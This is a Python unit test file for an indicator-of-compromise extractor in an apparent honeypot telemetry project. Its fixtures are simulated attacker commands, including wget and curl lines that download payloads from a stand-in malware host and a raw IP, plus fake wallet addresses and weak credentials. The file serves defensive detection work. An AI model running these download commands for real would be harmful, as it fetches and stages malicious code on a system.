"""IOC extractor (Phase 4). Pure-logic tests with fakes."""

from __future__ import annotations

from types import SimpleNamespace

from deceptinet.telemetry.ioc import extract_iocs


def _ev(cmd, etype="command", response=None):
    return SimpleNamespace(event_type=etype, command=cmd, response=response, meta={})


def _cred(u, p, accepted=False):
    return SimpleNamespace(username=u, password=p, accepted=accepted)


def test_extracts_url_ip_hash_wallets():
    events = [
        _ev("wget http://malware.example/x.sh -O /tmp/x.sh"),
        _ev("curl http://185.220.101.5/payload"),
        _ev("echo d41d8cd98f00b204e9800998ecf8427e  # md5"),
        _ev("send to bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"),
        _ev("eth 0x52908400098527886E0F7030069857D2E4169EE7"),
    ]
    iocs = extract_iocs(events, [])
    assert "http://malware.example/x.sh" in iocs["url"]
    assert "malware.example" in iocs["domain"]
    assert "185.220.101.5" in iocs["ipv4"]
    assert "d41d8cd98f00b204e9800998ecf8427e" in iocs["md5"]
    assert iocs["btc_wallet"]
    assert iocs["eth_wallet"] == ["0x52908400098527886E0F7030069857D2E4169EE7"]
    # download tool -> payload_url
    assert "http://malware.example/x.sh" in iocs["payload_url"]


def test_credentials_collected():
    iocs = extract_iocs([], [_cred("root", "123456"), _cred("admin", None)])
    assert "root:123456" in iocs["credential"]
    assert "admin:" in iocs["credential"]


def test_loopback_filtered_and_empty_clean():
    events = [_ev("curl http://127.0.0.1/")]
    iocs = extract_iocs(events, [])
    assert "127.0.0.1" not in iocs.get("ipv4", [])
    # an empty session yields no IOC keys
    assert extract_iocs([], []) == {}
